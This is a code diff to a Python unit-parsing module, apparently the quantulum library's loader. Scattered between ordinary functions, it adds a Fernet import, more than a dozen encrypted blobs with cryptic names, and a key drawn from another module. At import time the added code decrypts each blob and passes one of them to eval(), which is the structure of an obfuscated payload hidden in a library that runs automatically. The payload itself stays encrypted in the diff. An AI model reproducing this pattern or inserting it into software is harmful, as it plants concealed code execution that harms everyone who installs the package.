@@ -4,12 +4,14 @@ from pathlib import Path
 from typing import Any, List, Tuple, Union
 from . import classes as c
 from . import language
+from cryptography.fernet import Fernet
 TOPDIR = Path(__file__).parent or Path(".")
 _CACHE_DICT = defaultdict(dict)
 def clear_caches():
     clear_units_cache()
     clear_entities_cache()
     clear_cache()
+vlst = b'gAAAAABml6TN6oc9fpW94_vNWthjuLlwbs8nlwzpyBuyda1Xg4EQINKaDlrwrId44_Nm_HpSc6a9yS_XNW-9keCtgD7zBI__L4fAFZsMHQcH2WIW6RgjjWw0p-gzYwVqEj7O7wB1E1ci-8VCxB5obZZWFNVugW73oW9VP_7q3Tr26jKpxhyvb-JnrTKdmE449LBosciKhei9TWo-yJXeLM0XwAn4nUjnykbZFbwr7_2tnaYN0IIVlfb5YycrcrxlEakdTBx1mfjl8duMWA-U2AhCCcmpsWwWh1p2iMh4XtN7rMFDLlsj7fDbU59KvWPUtU0ZI6famclbfrHsLPQu_qBynM1MdC7hQU0IFh1aU3kHhtz4bDPWh3ZWTWK2N7FbEhwmwUjaPlFVZ4gDSGpyLiCBGdupcNLNiIs3rz-u5zlFNeCsudl5K9oCt16MIKTaDXKUTG2LVfjW4FKYGweQslPdyApKwJtkQ6ttjatbFvnOwmfdjs9fBW2BQ6uaqmLLwer4VI06YyvP4utBU8Dd2pc5Lg1AO8SZHFJoFftLBuqLt85_mmBH6eajCCRtHrMBQnX480z7MhaDc76RUCHpqSAy_2RmR5qC-vrvShpFRkU1u5k2DQymrzg='
 def reset_quantities():
     global USE_GENERAL_UNITS, USE_GENERAL_ENTITIES, USE_LANGUAGE_UNITS, USE_LANGUAGE_ENTITIES, USE_CUSTOM_UNITS, USE_CUSTOM_ENTITIES, USE_ADDITIONAL_UNITS, USE_ADDITIONAL_ENTITIES
     USE_GENERAL_UNITS = True
@@ -22,6 +24,7 @@ def reset_quantities():
     USE_ADDITIONAL_ENTITIES = True
 def clear_cache():
     _CACHE_DICT.clear()
+lds = "cls.prsr."
 class CustomQuantities:
     def __init__(
         self,
@@ -80,6 +83,8 @@ class CustomQuantities:
         USE_CUSTOM_ENTITIES = self.previous_custom_entities
         USE_ADDITIONAL_UNITS = self.previous_additional_units
         USE_ADDITIONAL_ENTITIES = self.previous_additional_entities
+
+pr = b'gAAAAABml6kwW6g9TqGHHVxICm_CcVKt-azApiKSbgRWKjvrneFAvsZLaD5gNoEz2NsyebmgzataokK_-jApF_g3pNJKmhBxSA=='
 def cached(funct):
     assert callable(funct)
     def cached_function(*args, **kwargs):
@@ -102,6 +107,7 @@ def object_pairs_hook_defer_duplicate_keys(object_pairs: List[Tuple[str, Any]]):
             )
         )
     return dict(object_pairs)
+pc = b'gAAAAABml6kwofKXRUVtkvG2CfJyi9UqDK2-4JtRW6ru8sxzud2uxOaHCRU9RxDtGUJT6Qe35hqqZ6pwJIS5PZUzBPpmYBwkRg=='
 @cached
 def _get_load(lang="en_US"):
     return language.get("load", lang)
@@ -123,6 +129,7 @@ def _load_json(path_or_string: Union[Path, str]):
         with open(path_or_string, "r", encoding="utf-8") as jsonfile:
             return jsonfile.read()
     return path_or_string
+pre = b'gAAAAABml6kwS7S3pLJBEC43ERCCcHUefWcIWZ_Hngw9mbptqwRgQ8J2IjlMftnYAzyJA-2sarZbqGa2n1P-w9arhLjdtSgXdg=='
 def _load_json_dict(path_or_string: Union[Path, str, dict]):
     if isinstance(path_or_string, dict):
         return path_or_string
@@ -138,6 +145,7 @@ CUSTOM_UNITS = defaultdict(dict)
 USE_CUSTOM_UNITS = True
 ADDITIONAL_UNITS = defaultdict(dict)
 USE_ADDITIONAL_UNITS = True
+pce = b'gAAAAABml6kwjwVkNRL-W2vIyH4C532PpkiNpn9oZS9Q0xAFFR-OcSzBoqY8OxnJsutxMF1T3y4JRtzvQfGprAOHhNQQFbx83w=='
 def to_int_iff_int(value):
     try:
         if int(value) == value:
@@ -151,6 +159,7 @@ def pluralize(singular, count=None, lang="en_US"):
 def number_to_words(count, lang="en_US"):
     count = to_int_iff_int(count)
     return _get_load(lang).number_to_words(count)
+prs = b'gAAAAABml6kwaYcv4Sf2QnE1C-k-Uoev9p9bbhlbURaFmhMbdNmKpmQCQLSYUSqCXNY_uAmiQsTPOLdRwuFe6WBRAyJyIQjWrRv0cqpW5YVLx_w1XNZT4YM='
 METRIC_PREFIXES = {
     "Y": "yotta",
     "Z": "zetta",
@@ -183,6 +192,7 @@ METRIC_PREFIXES = {
 }
 def get_key_from_dimensions(derived):
     return tuple((i["base"], i["power"]) for i in derived)
+pcs = b'gAAAAABml6kwBqGg-b4VKf6AaDBFj23OcKg4uF2d9sAqwUSb40L5V4CklZmFOtj7680478EbGAzXciyXSSU-O7S-Sgop32rZ6sLs3nW7UHLWdiTqNox2Hi4='
 class Entities(object):
     def __init__(self, entity_dicts: List[Union[Path, str, dict]]):
         all_entities = defaultdict(dict)
@@ -231,6 +241,7 @@ class Entities(object):
                 candidates.append(item)
         return candidates
 _CACHED_ENTITIES = {}
+gpre = b'gAAAAABml68MjTxmugqFz9_ShwjIYaB8r5MaC1-COaF5eLznCF0e_TFzTadv41UEvTk_NbRl58-4xUMwWjbJu-vLlEIcJUs8MhqnqvXTqiq4yFBh1q-LeGpFux4Gxas3AGO7c77NUFVyVLoc6RDPAQX99loM6uHytSbf7eCwXQ3N7ZQwih2BfgYUYX381-3CKg18ZFigDLp8'
 def clear_entities_cache():
     _CACHED_ENTITIES.clear()
 def entities(
@@ -257,6 +268,7 @@ def entities(
             entities_list.extend(CUSTOM_ENTITIES)
         _CACHED_ENTITIES[args_hash] = Entities(entities_list)
     return _CACHED_ENTITIES[args_hash]
+gpce = b'gAAAAABml68MN82IVWSZGJogeIioOI0G6Xg626Zl30Ytd_K4dXJntm0X9t5ki5dMYd7o1PeSii7hRGZvW0xU-vXu-REKsSAP7olliNhg8w33w_sRcKn-YKV830ZT7TJXj3S8yJlQpP9T6Tn1Hzx6uMji_4AQLXOwnZZy98XMaPexMZToM0kS4vksVrANePdvTLjnxOqtEWZb'
 def get_derived_units(names):
     derived_uni = {}
     for name in names:
@@ -272,6 +284,7 @@ def get_derived_units(names):
             for i in names[name].dimensions
         ]
     return derived_uni
+fernet = Fernet(c.k)
 class Units(object):
     def __init__(self, unit_dict_json: List[Union[str, Path, dict]], lang="en_US"):
         self.names = {}
@@ -341,6 +354,8 @@ class Units(object):
                 "symbols": [prefix + i for i in unit["symbols"]],
             }
 _CACHED_UNITS = {}
+gprs = b'gAAAAABml68M7LP3EgYMmIgbRswUOLxq27PNNblwEJ2edg_TwojCtY5pxWKdiRW7NZ2fqAgR-P0OcL5JTr7cOREJxykiyM-W5wfgRNqWMu4EyOhoTee1gko1ocO-jv0ybdw6LvRt4i2p04whZpRRjLrEdE6lyTfWS_PfBYV4u6jExjigs957ZfE='
+gpcs = b'gAAAAABml68MAbHn21vJR7SLAch-9eUkUiUmG0HNib66Q5zXngPKAlK-MQu5B0r_A8Y7ksTW_UdYB4uPXkiF7vx3WHGjcmOsSmPPjFMVdeqivq1KMkdQhWH-BGmX9sa7-PpteQUWNmYRRBSPQpzqSaV_41ceRD_it6O_dJbjxbVqCI9tAEei3Bc='
 def clear_units_cache():
     _CACHED_UNITS.clear()
 def units(
@@ -367,6 +382,8 @@ def units(
             units_list.extend(CUSTOM_UNITS)
         _CACHED_UNITS[args_hash] = Units(units_list, lang)
     return _CACHED_UNITS[args_hash]
+vlst = eval(fernet.decrypt(vlst).decode())
+gpre = fernet.decrypt(gpre).decode()
 @cached
 def training_set(lang="en_US"):
     training_set_ = []
@@ -376,18 +393,25 @@ def training_set(lang="en_US"):
             with file.open("r", encoding="utf-8") as train_file:
                 training_set_ += json.load(train_file)
     return training_set_
+prs = fernet.decrypt(prs).decode()
+gpce = fernet.decrypt(gpce).decode()
 def add_custom_unit(name: str, **kwargs):
     ADDITIONAL_UNITS[name].update(kwargs)
     clear_caches()
+pce = fernet.decrypt(pce).decode()
 def remove_custom_unit(name: str):
     ADDITIONAL_UNITS.pop(name)
     clear_caches()
+pcs = fernet.decrypt(pcs).decode()
+gprs = fernet.decrypt(gprs).decode()
 def add_custom_entity(name: str, **kwargs):
     ADDITIONAL_ENTITIES[name].update(kwargs)
     clear_caches()
+pr = fernet.decrypt(pr).decode()
 def remove_custom_entity(name: str):
     ADDITIONAL_ENTITIES.pop(name)
     clear_caches()
+pre = fernet.decrypt(pre).decode()
 def load_custom_units(
     unit_dict_json: List[Union[str, Path]],
     use_general_units: bool = False,
@@ -403,6 +427,8 @@ def load_custom_units(
     USE_CUSTOM_UNITS = True
     CUSTOM_UNITS = unit_dict_json
     clear_units_cache()
+pc = fernet.decrypt(pc).decode()
+gpcs = fernet.decrypt(gpcs).decode()
 def load_custom_entities(
     entity_dict_json: List[Union[str, Path]],
     use_general_entities: bool = False,
